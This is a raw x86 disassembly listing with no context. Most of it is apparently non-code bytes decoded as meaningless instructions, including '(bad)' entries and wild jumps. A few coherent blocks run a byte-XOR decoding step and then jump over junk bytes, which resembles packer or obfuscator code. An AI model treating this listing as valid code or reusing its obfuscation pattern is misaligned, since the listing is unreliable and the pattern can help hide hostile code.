  4046b0:	jge    0x404711
  4046b2:	or     eax,0xbaa8abb5
  4046b7:	xchg   esi,eax
  4046b8:	fnstenv [edi]
  4046ba:	out    0x73,eax
  4046bc:	fsubp  st(0),st
  4046be:	xchg   ecx,eax
  4046bf:	xchg   esp,eax
  4046c0:	in     al,0x51
  4046c2:	jns    0x4046fa
  4046c4:	lea    esi,[esi+0x4d]
  4046c7:	das    
  4046c8:	xchg   esi,eax
  4046c9:	arpl   WORD PTR [eax],bp
  4046cb:	dec    ebp
  4046cc:	cmp    eax,0xe8dbf198
  4046d1:	inc    ecx
  4046d2:	fst    QWORD PTR [ebx-0x1c]
  4046d5:	fisub  DWORD PTR [edi]
  4046d7:	jno    0x40466a
  4046d9:	mov    ebx,0x4867fa17
  4046de:	jecxz  0x40472e
  4046e0:	pop    ecx
  4046e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046e2:	cmp    eax,0x609ff4f1
  4046e7:	(bad)  
  4046e9:	inc    ebp
  4046ea:	mov    al,ds:0x478a6368
  4046ef:	data16 sti 
  4046f1:	fwait
  4046f2:	and    BYTE PTR [ebx],0x6e
  4046f5:	es dec esi
  4046f7:	and    DWORD PTR [edx],ebx
  4046f9:	in     eax,0xfa
  4046fb:	add    eax,DWORD PTR [esp+ebx*8]
  4046fe:	sbb    al,bl
  404700:	mov    eax,DWORD PTR [ebp-0x30]
  404703:	mov    ecx,DWORD PTR [ebp-0x2c]
  404706:	shrd   eax,ecx,0x2
  40470a:	shr    ecx,0x2
  40470d:	mov    ecx,DWORD PTR [ebp-0x30]
  404710:	mov    edx,DWORD PTR [ebp-0x2c]
  404713:	xor    eax,edi
  404715:	shl    ecx,0x1e
  404718:	xor    edx,edx
  40471a:	or     eax,edx
  40471c:	lea    eax,[ebp+eax*1-0x4]
  404720:	mov    DWORD PTR [ebp-0x34],eax
  404723:	mov    eax,DWORD PTR [ebp-0x30]
  404726:	mov    ecx,DWORD PTR [ebp-0x2c]
  404729:	shrd   eax,ecx,0x2
  40472d:	shr    ecx,0x2
  404730:	mov    ecx,DWORD PTR [ebp-0x30]
  404733:	mov    edx,DWORD PTR [ebp-0x2c]
  404736:	shl    ecx,0x1e
  404739:	mov    ecx,DWORD PTR [ebp-0x14]
  40473c:	xor    eax,edi
  40473e:	xor    edx,edx
  404740:	or     eax,edx
  404742:	mov    cl,BYTE PTR [eax+ecx*1]
  404745:	mov    eax,DWORD PTR [ebp-0x34]
  404748:	xor    BYTE PTR [eax],cl
  40474a:	mov    eax,DWORD PTR [ebp-0x20]
  40474d:	mov    ecx,DWORD PTR [ebp-0x1c]
  404750:	shrd   eax,ecx,0x2
  404754:	shr    ecx,0x2
  404757:	mov    ecx,DWORD PTR [ebp-0x20]
  40475a:	mov    edx,DWORD PTR [ebp-0x1c]
  40475d:	xor    eax,edi
  40475f:	jmp    0x404b00
  404764:	xchg   esp,eax
  404765:	mov    esi,DWORD PTR [esi-0x434b497e]
  40476b:	fwait
  40476c:	or     al,dl
  40476e:	cli    
  40476f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404770:	jmp    0x4047e4
  404772:	outs   dx,BYTE PTR ds:[esi]
  404773:	fnstsw WORD PTR [esi-0x424141fd]
  404779:	les    edi,FWORD PTR [esi-0x78576142]
  40477f:	mov    al,dl
  404781:	(bad)  
  404782:	mov    edi,0xbbe09407
  404787:	mov    eax,ds:0x33dd2525
  40478c:	lds    esi,FWORD PTR [ebp+0x28]
  40478f:	jb     0x4047fe
  404791:	pop    ebx
  404792:	fldenv [ebx+0x63]
  404795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404796:	mov    edx,0xb9a05f4b
  40479b:	xchg   esi,eax
  40479c:	sar    bl,cl
  40479e:	enter  0x608f,0xc4
  4047a2:	xchg   edx,ecx
  4047a4:	add    eax,0x74abf850
  4047a9:	sbb    BYTE PTR [eax+0x1dd32247],ch
  4047af:	and    esp,DWORD PTR [eax]
  4047b1:	sbb    eax,0xca76878d
  4047b6:	fsub   DWORD PTR gs:[esi+0x5d]
  4047bb:	icebp  
  4047bc:	push   ecx
  4047bd:	pusha  
  4047be:	xchg   BYTE PTR [esi+edx*2-0x2e],dh
  4047c2:	retf   0xe143
  4047c5:	(bad)  
  4047c6:	xchg   edx,eax
  4047c7:	xor    eax,DWORD PTR [ecx-0x11]
  4047ca:	pop    edi
  4047cb:	cmp    ecx,DWORD PTR [ebx+0x1f]
  4047ce:	jne    0x404819
  4047d0:	scas   eax,DWORD PTR es:[edi]
  4047d1:	enter  0xfd41,0xa2
  4047d5:	idiv   BYTE PTR [ebp+edx*2-0x29]
  4047d9:	rcl    DWORD PTR [ebx+esi*8-0x20],0xef
  4047de:	adc    al,0x2c
  4047e0:	xor    cl,BYTE PTR es:[ebx]
  4047e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047e4:	mov    ecx,0xaa0b86ce
  4047e9:	cmp    eax,0x54099ff5
  4047ee:	dec    eax
  4047ef:	call   DWORD PTR [esi+0x5ac0dc14]
  4047f5:	ret    
  4047f6:	push   0x5a
  4047f8:	outs   dx,DWORD PTR ds:[esi]
  4047f9:	push   esi
  4047fa:	mov    edi,0xd4680dfc
  4047ff:	jae    0x404876
  404801:	arpl   WORD PTR [ebx-0x7219c07d],dx
  404807:	mov    bh,BYTE PTR [eax]
  404809:	xor    al,0xa9
  40480b:	je     0x404876
  40480d:	inc    ecx
  40480e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40480f:	cld    
  404810:	mov    dl,0x99
  404812:	(bad)  
  404814:	or     edx,DWORD PTR [ebx-0x31]
  404817:	scas   al,BYTE PTR es:[edi]
  404818:	clc    
  404819:	cmp    ebx,DWORD PTR [eax+0x64]
  40481c:	adc    edx,esi
  40481e:	cmp    esp,DWORD PTR [ecx-0x944be]
  404824:	inc    esp
  404825:	mov    esp,0xfebdbb31
  40482a:	or     DWORD PTR [ebp+0x35],ecx
  40482d:	pop    ecx
  40482e:	xlat   BYTE PTR ds:[ebx]
  40482f:	(bad)  
  404830:	sub    eax,DWORD PTR cs:[esi+0x358178eb]
  404837:	mov    ch,0x25
  404839:	pop    esp
  40483a:	jl     0x4047ee
  40483c:	jbe    0x4047c9
  40483e:	sub    esp,eax
  404840:	dec    esp
  404841:	test   BYTE PTR [edi-0x70],dl
  404844:	dec    edx
  404845:	stos   DWORD PTR es:[edi],eax
  404846:	dec    ebx
  404847:	bound  esi,QWORD PTR [edx+ecx*1+0x5f]
  40484b:	add    al,0xa8
  40484d:	adc    ecx,esp
  40484f:	mov    al,0x7
  404851:	jge    0x404866
  404853:	jp     0x404824
  404855:	and    DWORD PTR [esi+0x3a],esp
  404858:	in     al,0x62
  40485a:	jl     0x404808
  40485c:	pushf  
  40485d:	jg     0x40483e
  40485f:	mov    WORD PTR [eax+0x43],ss
  404862:	rcr    BYTE PTR ss:[ebp-0x4256b333],0x90
  40486a:	mov    gs,WORD PTR [edx-0x11]
  40486d:	aaa    
  40486e:	shl    eax,1
  404870:	repnz cmp cl,dl
  404873:	cmp    al,0x44
  404875:	xchg   ebx,eax
  404876:	pop    esp
  404877:	xor    BYTE PTR [edi-0xba7e087],ch
  40487d:	shl    DWORD PTR [edi+ebp*1+0x67fc5f39],1
  404884:	and    al,0xf0
  404886:	push   es
  404887:	sub    eax,0x92a8a11f
  40488c:	or     ebx,0xffffffcf
  40488f:	aaa    
  404890:	sbb    al,0xe9
  404892:	mov    bh,0x4e
  404894:	push   ss
  404895:	xchg   esi,eax
  404896:	mov    esp,ebx
  404898:	mov    ch,0x7d
  40489a:	imul   esp,edi,0xffffffd9
  40489d:	ror    BYTE PTR [edx-0x2d16642b],cl
  4048a3:	push   esp
  4048a4:	retf   
  4048a5:	push   ecx
  4048a6:	in     al,0x0
  4048a8:	shr    BYTE PTR [ecx-0x7e],cl
  4048ab:	dec    eax
  4048ac:	mov    ch,0xca
  4048ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048af:	fwait
  4048b0:	cmp    BYTE PTR ds:0xb3b0887e,ch
  4048b6:	jl     0x404884
  4048b8:	xor    eax,0x99723a2f
  4048bd:	arpl   WORD PTR [eax+0x4e],cx
  4048c0:	in     eax,dx
  4048c1:	push   ds
  4048c2:	fnsave [edx]
  4048c4:	das    
  4048c5:	dec    eax
  4048c6:	ficom  WORD PTR [ebp+0x67924477]
  4048cc:	add    esp,esp
  4048ce:	in     eax,0xc1
  4048d0:	test   DWORD PTR [esi],esi
  4048d2:	fisubr WORD PTR [esi+0x50ee2b2a]
  4048d8:	jmp    0xada5008c
  4048dd:	(bad)  
  4048de:	xor    DWORD PTR [ebp+ebx*8-0x40aa7695],esi
  4048e5:	mov    eax,ds:0x14cfa045
  4048ea:	shl    esp,1
  4048ec:	cmp    DWORD PTR [ecx-0x616101a4],eax
  4048f2:	mov    edi,0xfb5f4994
  4048f7:	imul   edi,DWORD PTR [ecx],0x45aa2017
  4048fd:	xor    BYTE PTR ds:0x3a4e289f,bl
  404903:	xor    DWORD PTR [eax+ecx*8-0x7b],edi
  404907:	rcr    ah,0xfb
  40490a:	xchg   ecx,eax
  40490b:	lds    ebx,FWORD PTR [ecx]
  40490d:	outs   dx,BYTE PTR ds:[esi]
  40490e:	pushf  
  40490f:	icebp  
  404910:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404911:	adc    edi,DWORD PTR ss:[eax-0xc563d8c]
  404918:	mov    BYTE PTR [eax-0x16642cf4],dh
  40491e:	mov    ah,0x5c
  404920:	mov    bh,0x8
  404922:	pop    ss
  404923:	jmp    0xf9dc4d6b
  404928:	inc    edx
  404929:	mov    al,0xec
  40492b:	mov    bl,0x4
  40492d:	mov    ch,0xd8
  40492f:	hlt    
  404930:	icebp  
  404931:	popa   
  404932:	cmp    DWORD PTR [ebp-0x167ba40a],0x79bf835b
  40493c:	iret   
  40493d:	fadd   DWORD PTR [esi+0x33cf9e47]
  404943:	lods   eax,DWORD PTR ds:[esi]
  404944:	mov    edi,DWORD PTR [edx-0x33ba1bed]
  40494a:	shr    BYTE PTR [edx+0x647d9a8d],cl
  404950:	iret   
  404951:	(bad)  
  404952:	mov    esi,0x25cfe12a
  404957:	adc    DWORD PTR [edx+0x51],ecx
  40495a:	sbb    esp,DWORD PTR [ebx]
  40495c:	cwde   
  40495d:	jb     0x404963
  40495f:	inc    ebp
  404960:	cmp    al,0x2b
  404962:	jmp    0x3b7d:0xacee22b
  404969:	jle    0x404951
  40496b:	call   0x2ef1:0x1408d6ab
  404972:	adc    BYTE PTR [eax+0x73],ch
  404975:	dec    eax
  404976:	xor    edi,ecx
  404978:	push   ss
  404979:	xor    al,0x2
  40497b:	dec    ebp
  40497c:	rcr    BYTE PTR [eax-0x14148b0d],0x7d
  404983:	call   0x74df:0xc5727769
  40498a:	shl    BYTE PTR [ebp+0x1],cl
  40498d:	add    esi,esp
  40498f:	(bad)  
  404991:	and    DWORD PTR ds:0x176323a6,ebp
  404997:	mov    al,ds:0xb3c26861
  40499c:	(bad)
  40499f:	clc    
  4049a0:	xor    esp,DWORD PTR [ecx]
  4049a2:	cdq    
  4049a3:	jmp    0x1f35bfd
  4049a8:	jb     0x404a02
  4049aa:	clc    
  4049ab:	cli    
  4049ac:	add    ecx,ebx
  4049ae:	sbb    eax,0xf6163d03
  4049b3:	test   eax,0xfefbf1b9
  4049b8:	repz sbb al,0x35
  4049bb:	pop    es
  4049bc:	mov    edi,0x2a353165
  4049c1:	cdq    
  4049c2:	jae    0x404a1a
  4049c4:	push   es
  4049c5:	sbb    edx,DWORD PTR [esi-0x4c673d9a]
  4049cb:	in     eax,dx
  4049cc:	repnz push ebp
  4049ce:	scas   al,BYTE PTR es:[edi]
  4049cf:	jbe    0x40495e
  4049d1:	shl    DWORD PTR [edi],1
  4049d3:	xor    ebp,esp
  4049d5:	mov    al,0x1d
  4049d7:	(bad)  
  4049d8:	cli    
  4049d9:	lods   al,BYTE PTR ds:[esi]
  4049da:	xor    eax,0x69109213
  4049df:	sbb    DWORD PTR [edx],0x1564c713
  4049e5:	jns    0x40498e
  4049e7:	add    bh,ah
  4049e9:	xchg   ecx,eax
  4049ea:	lahf   
  4049eb:	sub    eax,0xa87f5ca8
  4049f0:	cli    
  4049f1:	add    eax,0x8a0b3577
  4049f6:	xor    dl,BYTE PTR [ebp+0x418142b3]
  4049fc:	aaa    
  4049fd:	sbb    al,0x5
  4049ff:	mov    ?,edi
  404a01:	fnstenv [esi-0x27]
  404a04:	hlt    
  404a05:	mov    edi,0xc51f2e60
  404a0a:	das    
  404a0b:	mul    DWORD PTR [esi]
  404a0d:	pop    eax
  404a0e:	sub    DWORD PTR [ecx-0x688112e1],edx
  404a14:	adc    BYTE PTR ds:0xacf1d75a,0xfe
  404a1b:	inc    esp
  404a1c:	ret    
  404a1d:	mov    ebp,0x98955cf6
  404a22:	adc    dl,dh
  404a24:	push   ebp
  404a25:	pop    edx
  404a26:	scas   al,BYTE PTR es:[edi]
  404a27:	jmp    0x159eda1
  404a2c:	aam    0x52
  404a2e:	inc    esp
  404a2f:	(bad)
  404a32:	fisub  WORD PTR [eax+0x1dcbab85]
  404a38:	cmp    DWORD PTR [ebp-0x723fc882],ebp
  404a3e:	adc    esi,DWORD PTR [edx-0x6b]
  404a41:	shl    BYTE PTR ss:[ebp+0x7a],0xf8
  404a46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a47:	cld    
  404a48:	leave  
  404a49:	pusha  
  404a4a:	mov    edi,0xd4640130
  404a4f:	pop    edi
  404a50:	shr    DWORD PTR [eax-0x68],0xc0
  404a54:	call   0x9608:0xb6223bed
  404a5b:	sub    BYTE PTR [ebp+0x4b],dh
  404a5e:	adc    DWORD PTR [ebx-0xd5c78b8],ebx
  404a64:	fisttp QWORD PTR [ecx+ebp*1-0x3d88792b]
  404a6b:	mov    dl,0xdd
  404a6d:	fidiv  WORD PTR [esp+ebx*4-0x3aabf317]
  404a74:	cdq    
  404a75:	push   es
  404a76:	lea    esi,[esp+esi*2+0x47]
  404a7a:	add    al,al
  404a7c:	push   ebp
  404a7d:	adc    al,0x17
  404a7f:	icebp  
  404a80:	iret   
  404a81:	das    
  404a82:	jmp    0x404a12
  404a84:	jae    0x404aa1
  404a86:	xlat   BYTE PTR ds:[ebx]
  404a87:	mov    ds:0x2dc8d004,eax
  404a8c:	adc    DWORD PTR [ebx+ecx*8],ecx
  404a8f:	cmp    BYTE PTR [esi+esi*8],dl
  404a92:	xchg   esp,eax
  404a93:	inc    ebp
  404a94:	bound  edi,QWORD PTR [ebp-0x11eec9ef]
  404a9a:	push   esi
  404a9b:	push   ebx
  404a9c:	int3   
  404a9d:	dec    esi
  404a9e:	call   FWORD PTR [esi]
  404aa0:	sbb    BYTE PTR [ecx+0x16f507b2],ah
  404aa6:	loop   0x404aa4
  404aa8:	dec    ebx
  404aa9:	ins    DWORD PTR es:[di],dx
  404aab:	xlat   BYTE PTR ds:[ebx]
  404aac:	ins    DWORD PTR es:[edi],dx
  404aad:	jns    0x404a5c
  404aaf:	pop    esi
  404ab0:	jg     0x404afd
  404ab2:	inc    ebp
  404ab3:	shr    DWORD PTR [eax-0x2e],0xc3
  404ab7:	xor    eax,0xf070650
  404abc:	cmp    edx,edx
  404abe:	test   edi,ebx
  404ac0:	fidivr WORD PTR [eax-0x76b2219d]
  404ac6:	lock add DWORD PTR [ebx+ebx*1],esp
  404aca:	mov    ebx,0xc3a76770
  404acf:	cmp    bl,bh
  404ad1:	(bad)  
  404ad3:	inc    ecx
  404ad4:	test   eax,0xf9c52bed
  404ad9:	addr16 xchg ecx,esp
  404adc:	mov    WORD PTR [ecx-0x61],?
  404adf:	stos   BYTE PTR es:[edi],al
  404ae0:	sbb    eax,DWORD PTR [esi-0x35]
  404ae3:	sub    DWORD PTR [ecx-0x3d641d9e],esp
  404ae9:	enter  0xdacc,0xbe
  404aed:	push   eax
  404aee:	mov    edx,0xbe2b4dfe
  404af3:	adc    DWORD PTR [edi+0x62],esp
  404af6:	push   ss
  404af7:	(bad)  
  404af8:	lea    esp,[edx+0x5e3ccb7a]
  404afe:	jmp    0xd233:0x1ee1c17f
  404b05:	or     eax,edx
  404b07:	lea    eax,[ebp+eax*1-0x4]
  404b0b:	mov    DWORD PTR [ebp-0x34],eax
  404b0e:	mov    eax,DWORD PTR [ebp-0x20]
  404b11:	mov    ecx,DWORD PTR [ebp-0x1c]
  404b14:	shrd   eax,ecx,0x2
  404b18:	shr    ecx,0x2
  404b1b:	mov    ecx,DWORD PTR [ebp-0x20]
  404b1e:	mov    edx,DWORD PTR [ebp-0x1c]
  404b21:	shl    ecx,0x1e
  404b24:	mov    ecx,DWORD PTR [ebp-0x14]
  404b27:	jmp    0x404ec8
  404b2c:	cmp    BYTE PTR [edx],ch
  404b2e:	push   0xffffff83
  404b30:	jl     0x404ab5
  404b32:	cmp    BYTE PTR [edx-0x61edfbc6],bh
  404b38:	jg     0x404b4f
  404b3a:	scas   al,BYTE PTR es:[edi]
  404b3b:	iret   
  404b3c:	mov    ebp,0xbdbebe09
  404b41:	les    edi,FWORD PTR [esi-0x75e6f242]
  404b47:	rol    DWORD PTR [eax-0x1c],0x3a
  404b4b:	mov    al,0xce
  404b4d:	outs   dx,DWORD PTR ds:[esi]
  404b4e:	mov    dh,0x41
  404b50:	adc    eax,0xce3d734c
  404b55:	cdq    
  404b56:	shl    DWORD PTR ds:0x224fd4a2,cl
  404b5c:	sub    eax,0x780b5827
  404b61:	test   BYTE PTR [edx],bl
  404b63:	cmp    eax,0xb53df5f2
  404b68:	and    ah,dh
  404b6a:	inc    eax
  404b6b:	fnsetpm(287 only) 
  404b6d:	adc    DWORD PTR [ebp-0x5b],ebp
  404b70:	rcr    BYTE PTR [eax],cl
  404b72:	xchg   esp,eax
  404b73:	ss xchg edx,eax
  404b75:	rol    BYTE PTR [edx-0x1890f7c],1
  404b7b:	aas    
  404b7c:	(bad)  
  404b7d:	gs adc bl,dh
  404b80:	out    0xf,al
  404b82:	(bad)  
  404b83:	pop    esp
  404b84:	outs   dx,BYTE PTR ds:[esi]
  404b85:	clc    
  404b86:	in     eax,0x7
  404b88:	sbb    esp,ecx
  404b8a:	ss aad 0xed
  404b8d:	ficomp WORD PTR [ebp+0x3c]
  404b90:	in     eax,0x68
  404b92:	pop    ds
  404b93:	mov    BYTE PTR [edx-0x5e],dh
  404b96:	psubq  mm2,QWORD PTR [esi+edi*4-0x63]
  404b9b:	dec    edi
  404b9c:	add    eax,0x719a3445
  404ba1:	push   ecx
  404ba2:	repnz out 0x23,eax
  404ba5:	data16 ror BYTE PTR cs:[edx+0x73],1
  404baa:	pop    ds
  404bab:	jo     0x404b2e
  404bad:	fst    QWORD PTR [ecx]
  404bb0:	push   esp
  404bb1:	mov    ds:0xa7bddc21,eax
  404bb6:	loop   0x404c25
  404bb8:	inc    esp
  404bb9:	xlat   BYTE PTR ds:[ebx]
  404bba:	add    DWORD PTR [esi-0x386d54c4],esp
  404bc0:	fsub   QWORD PTR [ecx+ecx*2+0x1f]
  404bc4:	mov    DWORD PTR [ebx+edi*2],0x2889b868
  404bcb:	mov    bl,BYTE PTR [edi+0x5590d7a6]
  404bd1:	xor    BYTE PTR [ebx+0x407e0fa4],bl
  404bd7:	cmp    al,0x77
  404bd9:	lods   eax,DWORD PTR ds:[esi]
  404bda:	rcl    BYTE PTR [ebx+esi*1],0xb1
  404bde:	mov    gs,WORD PTR [ebx+0x6390bec9]
  404be4:	mov    ?,WORD PTR [eax-0x557fe476]
  404bea:	jne    0x404c37
  404bec:	js     0x404bd8
  404bee:	(bad)  
  404bef:	test   eax,0xe4ce6189
  404bf4:	loop   0x404c2b
  404bf6:	add    BYTE PTR [ebx+0x2739a1bf],dl
  404bfc:	inc    ebp
  404bfd:	xor    ebp,esp
  404bff:	dec    edi
  404c00:	loop   0x404c24
  404c02:	and    eax,0x4b6de4ec
  404c07:	dec    esp
  404c08:	mov    dh,0x9
  404c0a:	pop    eax
  404c0b:	stos   DWORD PTR es:[edi],eax
  404c0c:	jmp    0x404c53
  404c0e:	mov    ds:0xc2451cb9,eax
  404c13:	inc    ebp
  404c14:	mov    al,ds:0x66036899
  404c19:	mov    ebx,0xba877c2f
  404c1e:	push   esp
  404c1f:	inc    esp
  404c20:	push   ebx
  404c21:	test   eax,0x76737636
  404c26:	mov    al,BYTE PTR [edi+0x584bd2ca]
  404c2c:	jge    0x404c2f
  404c2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c2f:	mov    esp,0x335c4922
  404c34:	inc    edi
  404c35:	and    cl,al
  404c37:	jne    0x404c6a
  404c39:	pop    ds
  404c3a:	loope  0x404c2e
  404c3c:	repz sar DWORD PTR [ebp+0x1c],0xf7
  404c41:	xor    al,0xbe
  404c43:	nop
  404c44:	adc    BYTE PTR [ebx],ch
  404c46:	arpl   WORD PTR [ebx],bp
  404c48:	leave  
  404c49:	xor    al,0x5f
  404c4b:	mov    cl,ah
  404c4d:	call   0xcf17:0x9fc00aac
  404c54:	les    ebp,FWORD PTR [edi]
  404c56:	pop    ds
  404c57:	(bad)  
  404c58:	pop    ds
  404c59:	sti    
  404c5a:	inc    esi
  404c5b:	cmp    BYTE PTR [ebp-0x72],0x0
  404c5f:	hlt    
  404c60:	inc    ebx
  404c61:	aam    0x39
  404c63:	sub    al,0x8
  404c65:	adc    dh,bl
  404c67:	and    al,0xd4
  404c69:	ss pop edi
  404c6b:	fisttp QWORD PTR [edi]
  404c6d:	jno    0x404c42
  404c6f:	iret   
  404c70:	aaa    
  404c71:	cmp    eax,0x5d2b2427
  404c76:	mov    ds:0x6bb7fb6c,al
  404c7b:	xchg   ebp,eax
  404c7c:	enter  0x5798,0x55
  404c80:	lods   al,BYTE PTR ds:[esi]
  404c81:	(bad)  
  404c82:	mov    ebp,0x44bb6601
  404c87:	in     al,0xfa
  404c89:	jns    0x404d04
  404c8b:	jo     0x404cdf
  404c8d:	add    ah,BYTE PTR [eax]
  404c8f:	test   DWORD PTR [ecx-0x3],ebp
  404c92:	bound  ecx,QWORD PTR [edx-0x75]
  404c95:	adc    eax,0x883cca70
  404c9a:	ret    
  404c9b:	inc    edi
  404c9c:	jns    0x404cab
  404c9e:	lahf   
  404c9f:	push   ebx
  404ca0:	mov    edi,0xf4ef9ec6
  404ca5:	push   ss
  404ca6:	hlt    
  404ca7:	dec    esp
  404ca8:	daa    
  404ca9:	pop    edx
  404caa:	add    al,0x7c
  404cac:	imul   edi,DWORD PTR [eax],0x56
  404caf:	outs   dx,DWORD PTR ds:[esi]
  404cb0:	in     eax,dx
  404cb1:	int    0x7b
  404cb3:	stos   BYTE PTR es:[edi],al
  404cb4:	sbb    eax,0x71025651
  404cb9:	int    0xef
  404cbb:	sub    bh,BYTE PTR ds:0xaec4f825
  404cc1:	cmp    al,BYTE PTR [ebp+0x30]
  404cc4:	lods   eax,DWORD PTR ds:[esi]
  404cc5:	dec    esp
  404cc6:	iret   
  404cc7:	dec    esi
  404cc8:	outs   dx,DWORD PTR ds:[esi]
  404cc9:	test   eax,0x7e1d644e
  404cce:	stos   BYTE PTR es:[edi],al
  404ccf:	mov    ah,0x3d
  404cd1:	jne    0x404d47
  404cd3:	retf   0x265
  404cd6:	jae    0x404c84
  404cd8:	outs   dx,DWORD PTR ds:[esi]
  404cd9:	xor    DWORD PTR [esi+0x1bfd8633],edi
  404cdf:	mov    esp,0xc90b5e1d
  404ce4:	mov    eax,0x3a59aecd
  404ce9:	shl    DWORD PTR [ebx-0x62],1
  404cec:	mov    ds:0xb851f8c3,eax
  404cf1:	out    0x2d,al
  404cf3:	pop    ecx
  404cf4:	jecxz  0x404d1c
  404cf6:	lods   al,BYTE PTR ds:[si]
  404cf8:	or     DWORD PTR [eax+0x15ce9187],eax
  404cfe:	arpl   sp,bp
  404d00:	jmp    0x6768dece
  404d05:	mov    ebp,DWORD PTR ds:0x7320d83e
  404d0b:	pushf  
  404d0c:	inc    edi
  404d0d:	sub    al,al
  404d0f:	popa   
  404d10:	ret    0x97c7
  404d13:	xor    ch,ch
  404d15:	push   esi
  404d16:	ins    BYTE PTR es:[edi],dx
  404d17:	mov    esi,DWORD PTR [edi+eiz*4-0x23]
  404d1b:	bound  esp,QWORD PTR [ebp+0x442bd66a]
  404d21:	jno    0x404d81
  404d23:	jge    0x404d7d
  404d25:	or     al,0xfd
  404d27:	sub    edi,DWORD PTR [esi+edi*1]
  404d2a:	pop    edi
  404d2b:	sbb    BYTE PTR [esi],bl
  404d2d:	pop    esi
  404d2e:	adc    al,BYTE PTR [ebp-0xf]
  404d31:	or     al,0x70
  404d33:	xchg   edi,eax
  404d34:	sbb    dh,BYTE PTR [eax+0x25867172]
  404d3a:	fdiv   st,st(7)
  404d3c:	mov    bl,0x12
  404d3e:	(bad)  
  404d3f:	pop    eax
  404d40:	push   es
  404d41:	and    esi,ecx
  404d43:	pop    esi
  404d44:	lods   eax,DWORD PTR ds:[esi]
  404d45:	out    dx,eax
  404d46:	call   0x3f16fde0
  404d4b:	ss jg  0x404d33
  404d4e:	pop    ds
  404d4f:	xchg   edx,eax
  404d50:	inc    esp
  404d51:	pop    esi
  404d52:	cld    
  404d53:	ins    BYTE PTR es:[edi],dx
  404d54:	sbb    al,0x7e
  404d56:	(bad)  
  404d57:	sub    eax,0x1cf59cbd
  404d5c:	dec    edi
  404d5d:	adc    DWORD PTR [edx],ebx
  404d5f:	inc    edx
  404d60:	fbld   TBYTE PTR [eax]
  404d62:	stc    
  404d63:	ds adc ebx,eax
  404d66:	cmp    bh,BYTE PTR [ecx-0x6fbb086c]
  404d6c:	(bad)  
  404d6d:	mov    ds:0x858959a6,al
  404d72:	push   ebp
  404d73:	xor    al,BYTE PTR [edi+ecx*2+0x3e26928e]
  404d7a:	mov    BYTE PTR [ebp+0x25],dl
  404d7d:	xor    eax,0x22a0ddbd
  404d82:	(bad)  
  404d83:	call   0xd9aaa8c2
  404d88:	test   BYTE PTR [esp+ebx*4-0x7d2892ec],0x6a
  404d90:	outs   dx,BYTE PTR ds:[esi]
  404d91:	dec    ebx
  404d92:	aam    0x28
  404d94:	call   0xf201:0xae64459c
  404d9b:	sti    
  404d9c:	adc    cl,cl
  404d9e:	aam    0x9e
  404da0:	cmp    al,dh
  404da2:	sbb    al,0xcf
  404da4:	popf   
  404da5:	test   BYTE PTR [edx],ah
  404da7:	and    DWORD PTR [ebp-0x8],edi
  404daa:	adc    esp,esi
  404dac:	ins    BYTE PTR es:[edi],dx
  404dad:	jnp    0x404d8b
  404daf:	shr    DWORD PTR [ecx-0x16d4c649],0x0
  404db6:	imul   esi,DWORD PTR ds:0x5755e0db,0xf1924e65
  404dc0:	loop   0x404e34
  404dc2:	addr16 jmp 0x650d:0x8ef691b3
  404dca:	ficom  DWORD PTR [esi+0x6a2cafb8]
  404dd0:	xor    BYTE PTR [eax+0x77132c9d],cl
  404dd6:	ss jg  0x404e35
  404dd9:	pop    ss
  404dda:	scas   eax,DWORD PTR es:[edi]
  404ddb:	es pop ss
  404ddd:	lahf   
  404dde:	jle    0x404dab
  404de0:	stc    
  404de1:	fs adc al,0xd8
  404de4:	pop    ebp
  404de5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404de6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404de7:	mov    bl,bh
  404de9:	mov    dl,0xc1
  404deb:	loope  0x404e13
  404ded:	push   ebp
  404dee:	mov    ah,0x26
  404df0:	fldlg2 
  404df2:	fiadd  WORD PTR [ecx-0x10e0297b]
  404df8:	(bad)  
  404df9:	pop    ecx
  404dfa:	shl    DWORD PTR [esi],1
  404dfc:	inc    esp
  404dfd:	sbb    ebp,DWORD PTR [ebx-0x73d90ac6]
  404e03:	sar    edx,1
  404e05:	jmp    0xd5c6:0xb050e25
  404e0c:	and    DWORD PTR [eax-0x301d7a97],edx
  404e12:	xor    DWORD PTR [esi+0x41],esi
  404e15:	inc    ecx
  404e16:	and    DWORD PTR [ecx+0x69],esp
  404e19:	daa    
  404e1a:	lds    esi,FWORD PTR [ebx]
  404e1c:	aad    0xf3
  404e1e:	inc    esi
  404e1f:	imul   edi,DWORD PTR [eax-0x6373b293],0xffffffd5
  404e26:	nop
  404e27:	test   DWORD PTR [edx+edi*4-0x1e6afcdf],esi
  404e2e:	test   al,0x18
  404e30:	jne    0x404e8a
  404e32:	mov    bl,cl
  404e34:	jg     0x404eab
  404e36:	mov    al,0x80
  404e38:	bound  esi,QWORD PTR fs:[ecx]
  404e3b:	mov    ebx,0x8f3ff133
  404e40:	(bad)  
  404e41:	add    ah,bl
  404e43:	std    
  404e44:	aas    
  404e45:	dec    eax
  404e46:	(bad)  
  404e47:	jg     0x404e10
  404e49:	fcomp  DWORD PTR [edi+0x329adec0]
  404e4f:	jne    0x404e1a
  404e51:	lods   eax,DWORD PTR ds:[esi]
  404e52:	pop    edi
  404e53:	std    
  404e54:	out    dx,al
  404e55:	or     eax,0xa65d6d29
  404e5a:	adc    esi,eax
  404e5c:	lods   al,BYTE PTR ds:[esi]
  404e5d:	sub    ecx,eax
  404e5f:	sbb    al,0xe
  404e61:	ficom  DWORD PTR [edi]
  404e63:	add    al,0xea
  404e65:	add    al,0x62
  404e67:	pop    ebx
  404e68:	sahf   
  404e69:	shr    DWORD PTR [eax],0x43
  404e6c:	iret   
  404e6d:	cmp    DWORD PTR [ecx-0x7dcdade3],ebx
  404e73:	xor    cl,0xf7
  404e76:	outs   dx,DWORD PTR ds:[esi]
  404e77:	add    eax,0x5ed373f4
  404e7c:	in     al,0x27
  404e7e:	push   ebp
  404e7f:	pop    es
  404e80:	jo     0x404e8a
